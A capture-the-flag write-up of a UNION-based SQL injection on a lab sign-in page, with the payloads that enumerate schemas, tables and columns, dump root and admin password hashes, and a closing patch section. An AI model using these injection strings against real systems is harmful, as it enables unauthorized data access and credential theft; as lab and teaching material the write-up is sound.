# SQL Injection on the Sign-In Page to Get the Flag

## How We Found It  
We started out on the sign-in page at:  
`http://10.11.248.192/?page=signin`  
Initially, we tried to brute-force the login but ran into a built-in delay (1 second per attempt). Instead, we looked for a SQL injection vulnerability in previous members page. Using a UNION-based injection, we first enumerated the available databases with:

```sql
1 UNION SELECT schema_name, NULL FROM information_schema.schemata
```

This revealed a database called **Member_Brute_Force**. Next, we listed its tables by running: 

```sql
UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)
```

We found a table named **db_default**. To discover its structure, we enumerated its columns with:  

```sql
UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=CHAR(100,98,95,100,101,102,97,117,108,116) AND table_schema=CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)
```

This revealed columns for id, username, and password. Finally, we extracted the login credentials using:  

```sql
UNION SELECT username, password FROM Member_Brute_Force.db_default
```

The injection returned two sets of credentials:  
- **username:** root  
- **password:** 3bf1114a986ba87ed28fc1b5884fc2f8  

- **username:** admin  
- **password:** 3bf1114a986ba87ed28fc1b5884fc2f8  

After analyzing the hash, we figured out the actual password was "shadow". We then used the credentials **root/shadow** to sign in and got the flag.

## Utility of It  
This kind of SQL injection vulnerability is highly dangerous in real-world applications. By exploiting unsanitized user inputs, attackers can bypass authentication, access sensitive data, or even take over systems entirely. It’s a reminder of why securing database queries is so important.

## How Can We Patch It  
To prevent these attacks, always validate and sanitize user inputs. Use prepared statements or parameterized queries instead of directly building SQL strings. Additionally, limit the database privileges for the application user so that even if an injection occurs, the damage is minimized.
